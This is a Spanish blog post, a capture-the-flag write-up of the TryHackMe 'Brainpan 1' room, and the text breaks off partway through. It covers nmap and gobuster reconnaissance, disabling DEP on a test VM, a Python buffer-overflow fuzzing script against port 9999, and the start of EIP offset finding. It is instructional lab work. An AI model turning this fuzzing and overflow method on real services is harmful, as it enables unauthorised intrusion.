<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="dias antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Brainpan 1 - THM Writeup" /><meta property="og:locale" content="es" /><meta name="description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><meta property="og:description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><link rel="canonical" href="https://rjceledon.github.io/posts/brainpan-thm-writeup/" /><meta property="og:url" content="https://rjceledon.github.io/posts/brainpan-thm-writeup/" /><meta property="og:site_name" content="Rich J. Celedon" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-12T14:22:30+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Brainpan 1 - THM Writeup" /><meta name="twitter:site" content="@" /> <script type="application/ld+json"> {"description":"Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico.","url":"https://rjceledon.github.io/posts/brainpan-thm-writeup/","@type":"BlogPosting","headline":"Brainpan 1 - THM Writeup","dateModified":"2022-01-17T23:08:58+00:00","datePublished":"2022-01-12T14:22:30+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://rjceledon.github.io/posts/brainpan-thm-writeup/"},"@context":"https://schema.org"}</script><title>Brainpan 1 - THM Writeup | Rich J. Celedon</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Rich J. Celedon"><meta name="application-name" content="Rich J. Celedon"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/bio-photo.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Rich J. Celedon</a></div><div class="site-subtitle font-italic">Ciberseguridad y Hacking Etico</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVOS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rjceledon" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['zeytips','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Brainpan 1 - THM Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Brainpan 1 - THM Writeup</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://twitter.com/">Rich J. Celedon</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" date="2022-01-12 14:22:30 +0000" data-toggle="tooltip" data-placement="bottom" title="Wed, 12 Jan, 2022, 2:22 PM +0000" >12 Jan, 2022</em> </span> <span> Actualizado <em class="timeago" date="2022-01-17 19:08:58 -0400 " data-toggle="tooltip" data-placement="bottom" title="Mon, 17 Jan, 2022, 7:08 PM -0400" >17 Jan, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3701 palabras"> <em>20 min</em> leer</span></div></div></div><div class="post-content"><p><img data-src="https://tryhackme-images.s3.amazonaws.com/room-icons/f184bf1424977ce8b3198d1a8c212700.png" alt="image" width="100" data-proofer-ignore></p><p>El dia de hoy se presenta una guia o <code class="language-plaintext highlighter-rouge">writeup</code> sobre una maquina interesante en la plataforma de <a href="https://tryhackme.com/room/brainpan">TryHackMe</a> la cual segun su propia descripcion indica que se hara un analisis de una vulnerabilidad por desbordamiento de buffer (<code class="language-plaintext highlighter-rouge">buffer overflow</code>) de un archivo ejecutable de <code class="language-plaintext highlighter-rouge">Windows .exe</code>, lo cual nos prepara de cierta forma para un reto en la certificacion <a href="https://www.offensive-security.com/pwk-oscp/">OSCP</a> que es una de las mas demandadas a nivel profesional en el campo de la <em>Ciberseguridad</em> que tanto seguimos, por lo tanto todo esto comprende un reto tambien importante para nosotros al introducirnos en el area profesional del <code class="language-plaintext highlighter-rouge">Hacking Etico</code>.</p><p>Un desbordamiento de bufer se refiere a una anomalia en donde un programa, mientras escribe en los buferes de memoria asignados para ciertas variables o registros, sobrepasa los limites de algun bufer, llegando a escribir en locaciones de memoria adyacentes como se presenta a continuacion: <img data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Buffer_overflow_basicexample.svg/1280px-Buffer_overflow_basicexample.svg.png" alt="image" width="500" data-proofer-ignore></p><p class="alert alert-info">Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don’t give up (or look at writeups), just try harder.</p><p>Esta caja en particular no utiliza <code class="language-plaintext highlighter-rouge">flag</code> de hashes en archivos <code class="language-plaintext highlighter-rouge">.txt</code> pero de igual forma completaremos los objetivos segun se vayan logrando los cuales son:</p><ol><li>Deploy the machine.<li>Gain initial access<li>Escalate your privileges to root.</ol><p><strong>Sin saltarse ninguno antes de realmente completarlo</strong>, vamos paso a paso.</p><p>Una vez logeados, procedemos a iniciar la maquina <del>y agregarle 1 hora mas por si acaso</del>, luego nos conectamos al VPN con</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="nb">sudo </span>openvpn /PATHTO/USER.ovpn</code></p></blockquote><p>Aqui ya podemos marcar el primer objetivo como completado, y empezamos…</p><h2 id="reconocimiento">RECONOCIMIENTO <a href="#reconocimiento" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Como siempre primero podemos hacer un <code class="language-plaintext highlight highlighter-rouge">ping <span class="nt">-c</span> 1 IP</code> para determinar el <code class="language-plaintext highlighter-rouge">TTL</code> de la respuesta a ver si se acerca a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.</p><p>Luego seguimos con nuestro escaneo con la herramienta <code class="language-plaintext highlight highlighter-rouge">nmap</code> para identificar puertos abiertos y mucho mas con:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.10.136.187 <span class="nt">-oN</span> puertos.txt</code> <img data-src="https://user-images.githubusercontent.com/85322110/149168356-1fdfc1b9-5f1a-4139-93b3-ee11283955f7.png" alt="image" data-proofer-ignore></p></blockquote><p>Para ver <strong>todos</strong> los puertos TCP <code class="language-plaintext highlighter-rouge">-p-</code>, solo listar puertos <code class="language-plaintext highlighter-rouge">--open</code>, con velocidad maxima de escaneo <code class="language-plaintext highlighter-rouge">-T5</code>, sin resolucion DNS <code class="language-plaintext highlighter-rouge">-n</code>, <code class="language-plaintext highlighter-rouge">-v</code>erbosidad para ver puertos abiertos en salida y guardando un archivo <code class="language-plaintext highlighter-rouge">-oN puertos.txt</code></p><p>Procedemos a analizar en mas detalle los puertos abiertos pasandoles scripts basicos de enumeracion <code class="language-plaintext highlighter-rouge">-sC</code> y deteccion de version <code class="language-plaintext highlighter-rouge">-sV</code>, con salida al archivo <code class="language-plaintext highlighter-rouge">version.txt</code>.</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.137.187 <span class="nt">-oN</span> version.txt</code> <img data-src="https://user-images.githubusercontent.com/85322110/149168625-79fe0007-3015-4b83-a756-1037538c7a3f.png" alt="image" data-proofer-ignore></p></blockquote><p>Vemos que existen dos puertos <code class="language-plaintext highlighter-rouge">9999,10000</code> que buscando en internet lo que es <code class="language-plaintext highlighter-rouge">abyss</code> es un protocolo de interfaz de web, asi que los dos deberian ser paginas HTTP, sin embargo al abrir en el navegador nos topamos que solo el puerto <code class="language-plaintext highlighter-rouge">http://10.10.136.187:10000/</code> es el unico que responde a <code class="language-plaintext highlighter-rouge">whatweb</code> y a nuestro explorador de internet con sitio estatico sin mucha informacion acerca de la maquina.</p><p>De resto con el puerto <code class="language-plaintext highlighter-rouge">9999</code> habiamos visto un banner que se envio a traves de la enumeracion de <code class="language-plaintext highlighter-rouge">nmap</code>, asi que podemos entablar una conexion <code class="language-plaintext highlighter-rouge">telnet</code> por el puerto especificado a ver que envia el servidor: <img data-src="https://user-images.githubusercontent.com/85322110/149183450-35108248-1504-4913-9998-f182054c2069.png" alt="image" data-proofer-ignore></p><p>La conexion al abrirse nos muestra el banner de brainpan, y se queda esperando por una clave que no conocemos, y si es erronea la conexion se cierra. Por los momentos dejaremos este puerto tranquilo y veremos el otro.</p><p>Podemos hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> que es la tecnica que se usa para buscar alguna ruta existente en subdirectorios de la pagina, para ello podemos usar la herramienta <code class="language-plaintext highlighter-rouge">gobuster</code> desarrollada en lenguaje Go:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">gobuster <span class="nb">dir</span> <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.137.187:10000/ <span class="nt">--no-error</span></code> <img data-src="https://user-images.githubusercontent.com/85322110/149178025-223b96ac-0283-44e3-8d68-254ee7d4df93.png" alt="image" data-proofer-ignore></p></blockquote><p>Haciendo uso de su funcion <code class="language-plaintext highlighter-rouge">dir</code> con 200 threads <code class="language-plaintext highlighter-rouge">-t</code>, usando el diccionario <code class="language-plaintext highlighter-rouge">-w directory-list-2.3-medium.txt</code> que es muy usado, pasandole la URL <code class="language-plaintext highlighter-rouge">-u</code> con el puerto 10000, y poniendo <code class="language-plaintext highlighter-rouge">--no-error</code> para evitar mostrar errores de timeout, vemos que aun sin terminar ya encontro un subdirectorio <code class="language-plaintext highlighter-rouge">bin</code> que si lo abrimos en el explorador: <img data-src="https://user-images.githubusercontent.com/85322110/149178982-47301116-32fb-475e-8cea-a4b01437951b.png" alt="image" data-proofer-ignore></p><p>Vemos un <code class="language-plaintext highlighter-rouge">directory listing</code> donde podemos ver un archivo <code class="language-plaintext highlighter-rouge">brainpan.exe</code>, este vamos a descargarlo a nuestra maquina Linux para hacerle analisis y seguimos con la siguiente etapa…</p><h2 id="escaneo">ESCANEO <a href="#escaneo" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Nos bajamos el archivo <code class="language-plaintext highlighter-rouge">brainpan.exe</code> con <code class="language-plaintext highlighter-rouge">wget</code> y poniendo la ruta, y usamos <code class="language-plaintext highlighter-rouge">file</code> para ver que tipo de binario es: <img data-src="https://user-images.githubusercontent.com/85322110/149179578-047f82f1-f162-4337-a0ed-4eb3839d6f76.png" alt="image" data-proofer-ignore></p><p>Vemos que es un archivo hecho para Windows en version de 32 bits. En este punto para poder ver que es lo que hace este ejecutable, y para debuggearlo de una mejor forma, nos descargaremos e instalaremos una maquina virtual con <code class="language-plaintext highlighter-rouge">Windows 7 32-bits</code>. Yo usare la imagen de <a href="https://www.dprojects.org/minios">Windows 7 SP1 MiniOS7 PRO x86</a> de <a href="https://www.youtube.com/channel/UCU876E5XzldL34k0ZtY3o9g">Daniel (Doofy) Rodriguez</a>, que tiene un tamaño de archivo menor, es una version mas ligera, tiene una instalacion mas rapida y nos funciona de maravilla para la tarea que vamos a realizar.</p><p>Una vez tengamos nuestra maquina montada, descargamos e instalamos el <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> que es la herramienta de analisis de binarios e ingenieria inversa que se recomienda en el OSCP y es la mas comunmente usada para este tipo de investigacion: <img data-src="https://user-images.githubusercontent.com/85322110/149190124-4a6caaee-9740-4258-941e-88284277e30e.png" alt="image" data-proofer-ignore></p><p>En esta maquina requeriremos de desactivar la <code class="language-plaintext highlighter-rouge">Data Execution Protection</code> que es el mecanismo que se utiliza a nivel de hardware para marcar la memoria con atributos que indican que la ejecucion de comandos no sea posible en espacios de memoria asignados, con esto desactivado podremos hacer el debug y probar el exploit sin ningun problema. Para desactivar esto necesitamos abrir una consola <code class="language-plaintext highlighter-rouge">cmd.exe</code> con permisos de Administrador y enviar el siguiente comando:</p><blockquote><p><code class="language-cmd highlight">BCDEDIT /SET {CURRENT} NX ALWAYSOFF</code></p></blockquote><p>Una vez enviado el comando, reiniciamos la maquina Windows y ya la <code class="language-plaintext highlighter-rouge">DEP</code> estara desactivada, ahora tenemos que ver la forma de como enviar el archivo <code class="language-plaintext highlighter-rouge">brainpan.exe</code> a esta maquina, podemos hacerlo usando <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>, <code class="language-plaintext highlight highlighter-rouge">python <span class="nt">-m</span> http.server</code> o cualquier otro medio, recordando siempre que aca se deben usar las IPs de la red NAT que otorga nuestro software de virtualizacion (aca estamos usando <a href="https://www.vmware.com/latam/products/workstation-player/workstation-player-evaluation.html">VMWare Workstation Player</a>): <img data-src="https://user-images.githubusercontent.com/85322110/149192926-dee3952b-1a37-4421-8d26-402adc12e82e.png" alt="image" data-proofer-ignore></p><p>Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> ya que el servidor web con <code class="language-plaintext highlight highlighter-rouge">python <span class="nt">-m</span> http.server</code> dio alertas con <code class="language-plaintext highlighter-rouge">Internet Explorer</code> y por no instalar otro explorador, nos quedamos con SMB.</p><p>Luego abrimos una consola, vamos a la ruta del archivo y lo corremos desde <code class="language-plaintext highlighter-rouge">cmd.exe</code>, nos damos cuenta que abre un puerto <code class="language-plaintext highlighter-rouge">9999</code> esperando por conexion: <img data-src="https://user-images.githubusercontent.com/85322110/149193320-2ca5c8ff-86c2-498b-b7cf-e4b63eeb2109.png" alt="image" data-proofer-ignore></p><p>Y si probamos hacer <code class="language-plaintext highlighter-rouge">telnet</code> desde nuestra maquina Linux a este nuevo servidor recibimos el mismo banner anterior y la respuesta es recibida desde la consola Windows: <img data-src="https://user-images.githubusercontent.com/85322110/149193796-cc7dced2-ff21-4621-a22c-4ff09f627f1d.png" alt="image" data-proofer-ignore></p><p>Con esto concluimos que es el mismo servicio abierto en la maquina <code class="language-plaintext highlighter-rouge">Brainpan 1</code> y seguiremos con su analisis a ver de que manera puede ser explotado.</p><p>Para ello podemos crear un script para hacer fuzzing de desbordamiento a ver si este binario es susceptible a <code class="language-plaintext highlighter-rouge">buffer overflow</code>, esto se hara con el siguiente script en <code class="language-plaintext highlighter-rouge">Python</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span> <span class="c1">#socket para conexiones, sys para pasar argumentos, time para usar sleep
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">ip_addr</span> <span class="o">=</span>  <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="c1">#Tomamos los valores de IP y Puerto
</span>    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">string</span> <span class="o">=</span> <span class="s">'A'</span> <span class="c1">#Caracter a enviar
</span>    <span class="n">mult</span> <span class="o">=</span> <span class="mi">100</span> <span class="c1">#Multiplicador
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1">#Creando socket, AF_INET representa conexiones IPV4, SOCK_STREAM representa conexion TCP
</span>            <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#Si cualquier conexion del socket tarda mas de 5 segundos, salta a error except:
</span>            <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip_addr</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="c1">#Conectando al socket
</span>            <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="c1">#Recibiendo data inicial (banner)
</span>            <span class="k">print</span><span class="p">(</span><span class="s">"[*] Enviando"</span><span class="p">,</span> <span class="n">mult</span><span class="p">,</span> <span class="s">"caracteres...</span><span class="se">\r</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span> <span class="c1">#Con retorno y sin salto de linea para sobreescribir en el mismo texto
</span>            <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="n">string</span><span class="o">*</span><span class="n">mult</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin1'</span><span class="p">))</span> <span class="c1">#Enviando caracteres, usando encoder 'latin1' que no modifica los hex codes, python3 lo exije
</span>            <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="n">mult</span> <span class="o">+=</span> <span class="mi">100</span> <span class="c1">#Aumento de 100
</span>            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"    [!] Ocurrio un error! Bufer actual en"</span><span class="p">,</span> <span class="n">mult</span><span class="p">,</span> <span class="s">"caracteres..."</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>En los comentarios se puede leer la descripcion en cada linea, pero basicamente envia letras ‘A’ de 100 en 100 al socket conectado en el puerto 9999 de la maquina victima. Luego abrimos el proceso <code class="language-plaintext highlighter-rouge">brainpan.exe</code> nuevamente desde nuestra maquina Windows 7, y ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">python bofexploit.py</code> o <code class="language-plaintext highlighter-rouge">./bofexploit.py</code> si tiene permisos de ejecucion. Con esto vamos a ver como se van a ir enviando los caracteres pero… <strong>sorpresa!</strong>, vemos como el programa se corrompe al enviar <strong>600</strong> caracteres, esto significa que el programa es susceptible a este tipo de vulnerabilidad. <img data-src="https://user-images.githubusercontent.com/85322110/149200494-83ae3639-d6d2-489f-a79f-64d28d72e73a.png" alt="image" data-proofer-ignore></p><p>Ya con ello, vamos a nuevamente abrir el proceso <code class="language-plaintext highlighter-rouge">brainpan.exe</code> y abrimos nuestro <code class="language-plaintext highlighter-rouge">Immunity Debugger</code> que instalamos previamente, luego le damos a File -&gt; Attach para conectarnos con el proceso <code class="language-plaintext highlighter-rouge">brainpan.exe</code> (podemos hacer uso del sortear por Name) que ya esta abierto en nuestra consola <code class="language-plaintext highlighter-rouge">cmd.exe</code> <img data-src="https://user-images.githubusercontent.com/85322110/149200728-5c08beb5-63a0-4bab-88c0-d1642afeec2c.png" alt="image" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/85322110/149200902-48d1f3c3-a8ef-408b-adab-d4c9e387facc.png" alt="image" data-proofer-ignore></p><p>Sin embargo al conectarnos al proceso, este se pondra en estado Paused como se puede observar en la siguiente imagen, con eso debemos darle al boton de Play en la barra de arriba para que el proceso siga corriendo: <img data-src="https://user-images.githubusercontent.com/85322110/149201326-15a262db-289d-4988-b6f9-0784e934db69.png" alt="image" data-proofer-ignore></p><p>Luego de eso vamos a nuevamente correr nuestro script desde la maquina Linux y veremos el comportamiento del programa al momento de desbordarse el bufer y tener un error: <img data-src="https://user-images.githubusercontent.com/85322110/149205445-f6fd6131-c0fa-4d8c-ad9e-d0fbd697330c.png" alt="image" data-proofer-ignore></p><p>La letra <code class="language-plaintext highlighter-rouge">A</code> representada en hexadecimal (ascii) tiene la forma <code class="language-plaintext highlighter-rouge">0x41</code>, y vemos como dicho valor <code class="language-plaintext highlighter-rouge">41</code> se repite muchas veces en diferentes registros, esto pasa por lo siguiente: El Stack o Pila en memoria son una serie de espacios en donde se almacena la informacion, como vemos en la imagen, existe un area llamada <code class="language-plaintext highlighter-rouge">Buffer Space</code> que es donde el programa guarda ciertos parametros como variables locales, entre otros, siendo en nuestro caso el espacio donde el programa guarda la entrada del usuario por telnet. La forma de escritura de memoria en el caso de la imagen es hacia abajo, vemos como los registros <code class="language-plaintext highlighter-rouge">EBP</code> y <code class="language-plaintext highlighter-rouge">EIP</code> estan por debajo de la que seria nuestra posicion actual, y el desbordamiento de bufer ocurre cuando sobrepasamos el limite del bufer que seria asignado a nuestra variable, y vamos mas alla llenando los espacios subyacentes.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/149208231-96f3e8af-c3fa-45b0-9a4f-63932b5110c1.png" alt="image" width="300" data-proofer-ignore></p><p>El registro <code class="language-plaintext highlighter-rouge">EIP</code> es de extrema importancia, ya que es en donde se define a que instruccion debe saltar el programa en cada paso, si podemos escribir en el, teoricamente podemos dirigir el flujo del programa a nuestra conveniencia. Con esto en mente, debemos buscar una forma de saber cuantos caracteres exactamente necesitamos para llegar a ese registro <code class="language-plaintext highlighter-rouge">EIP</code>, ya que en dentro de el no queremos caracteres aleatorios o <code class="language-plaintext highlighter-rouge">A</code>es, necesitamos colocar en el una direccion en el programa que nos sirva para ejecutar comandos remotamente.</p><p>El concepto aca seria generar una serie de caracteres que no se repitan, enviar el desbordamiento de bufer, y ver que numero se coloca en el <code class="language-plaintext highlighter-rouge">EIP</code> para saber en que posicion de la cadena que enviamos es donde se ubicara ese registro.</p><p>Esto se puede hacer de multiples maneras, por aca lo haremos con <code class="language-plaintext highlighter-rouge">gdb-peda</code>, en nuestra maquina Linux utilizamos el comando <code class="language-plaintext highlight highlighter-rouge">gdb <span class="nt">-q</span></code> para abrir el GNU Debugger con peda, y luego usamos <strong>(no cerrar la ventana de gdb-peda ya que la usaremos mas adelante)</strong></p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">pattern create 600</code> <img data-src="https://user-images.githubusercontent.com/85322110/149210093-1db7d3a8-26af-4644-beb2-42ed17ef6027.png" alt="image" data-proofer-ignore></p></blockquote><p>Esto nos creara un patron de 600 caracteres (mayor que nuestro <code class="language-plaintext highlighter-rouge">buffer overflow</code>) que son unicos en series no repetitivas de 32 bits (4 Bytes = 4 chars), luego nos copiamos esto y debemos enviar nuevamente al servicio <code class="language-plaintext highlighter-rouge">brainpan.exe</code>, esto lo podriamos reemplazar en el bufer que se envia por nuestro Script de Python, pero para hacerlo mas sencillo podemos simplemente abrir una nueva sesion de <code class="language-plaintext highlighter-rouge">telnet</code> y enviarlo desde alli ya que los caracteres son reconocibles por consola.</p><p>Para esto hay que primero cerrar el <code class="language-plaintext highlighter-rouge">Immunity Debugger</code> si estaba abierto ya con el proceso <code class="language-plaintext highlighter-rouge">brainpan</code> asignado, luego volver a abrir el <code class="language-plaintext highlighter-rouge">brainpan.exe</code> desde consola, y luego volver a abrir <code class="language-plaintext highlighter-rouge">Immunity Debugger</code> y volver a Attach el proceso.</p><p>Una vez el proceso este activo, enviamos por <code class="language-plaintext highlighter-rouge">telnet</code> el patron creado en gdb-peda y vemos nuevamente el EIP que queda alojado en memoria. Vemos que pone un codigo <code class="language-plaintext highlighter-rouge">73413973</code>, este codigo nos lo copiamos y lo ponemos en <code class="language-plaintext highlighter-rouge">gdb-peda</code> con el comando <code class="language-plaintext highlight highlighter-rouge">patron offset 